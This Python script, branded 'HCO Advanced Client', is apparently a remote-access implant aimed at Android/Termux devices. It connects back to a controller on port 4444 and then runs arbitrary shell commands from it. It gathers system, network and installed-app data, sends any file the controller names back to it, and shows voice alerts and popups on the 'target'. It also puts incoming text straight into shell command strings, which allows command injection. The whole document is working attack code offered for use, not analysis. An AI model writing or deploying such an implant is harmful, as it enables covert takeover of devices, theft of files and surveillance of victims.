import socket
import subprocess

def run_client():
    print("""
    =========================================
         HCO ADVANCED CLIENT (v4.0 ACTIVE)   
    =========================================
    """)
    server_ip = input("[?] Enter Server IP (e.g., 192.168.1.10): ").strip()
    port = 4444
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((server_ip, port))
        print("[+] Connection Established with Controller!")
    except Exception as e:
        print(f"[-] Connection Failed: {e}")
        return
    
    while True:
        try:
            data = client.recv(4096).decode()
            if not data or data == 'exit':
                break
            
            # 1. Deep SysInfo + Network/IP/Carrier details
            if data == 'sysinfo':
                cmd = """
                echo '=== KERNEL & DEVICE ==='
                uname -a
                echo '\n=== USER & ID ==='
                whoami && id
                echo '\n=== NETWORK & IP INTERFACES ==='
                ifconfig 2>/dev/null || ip addr
                echo '\n=== ACTIVE CONNECTIONS ==='
                netstat -tunl 2>/dev/null || ss -tunl
                """
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                
            # 2. Voice Alert
            elif data.startswith('alert:'):
                msg = data.split('alert:')[1]
                subprocess.Popen(f"termux-tts-speak '{msg}'", shell=True)
                output = b"Voice alert successfully triggered on target speaker!"
                
            # 3. File Downloader
            elif data.startswith('download:'):
                file_path = data.split('download:')[1]
                try:
                    with open(file_path, 'rb') as f:
                        output = f.read()
                except Exception as file_err:
                    output = f"File Read Error: {str(file_err)}".encode()
                    
            # 4. Push Popup Notification
            elif data.startswith('popup:'):
                note_content = data.split('popup:')[1]
                notif_cmd = f"termux-notification --title 'HCO System Notice' --content '{note_content}'"
                subprocess.Popen(notif_cmd, shell=True)
                output = b"Notification popup successfully displayed on target screen!"
                
            # 5. List Installed Apps (Termux package list or pm list packages)
            elif data == 'apps':
                app_cmd = "pm list packages -f 2>/dev/null || pip list 2>/dev/null; dpkg -l 2>/dev/null"
                output = subprocess.check_output(app_cmd, shell=True, stderr=subprocess.STDOUT)
                
            # 6. Battery & Storage Info (Termux API battery status if available, or df/uptime)
            elif data == 'battery':
                batt_cmd = "termux-battery-status 2>/dev/null || echo 'Termux-API not installed for battery stats.'; echo '\n--- DISK STORAGE ---'; df -h"
                output = subprocess.check_output(batt_cmd, shell=True, stderr=subprocess.STDOUT)
                
            # 7. Custom Shell Command
            elif data.startswith('cmd:'):
                real_cmd = data.split('cmd:')[1]
                output = subprocess.check_output(real_cmd, shell=True, stderr=subprocess.STDOUT)
            else:
                output = b"Unknown payload protocol."
                
        except Exception as e:
            output = str(e).encode()
            
        client.send(output)
        
    client.close()

if __name__ == "__main__":
    run_client()
    
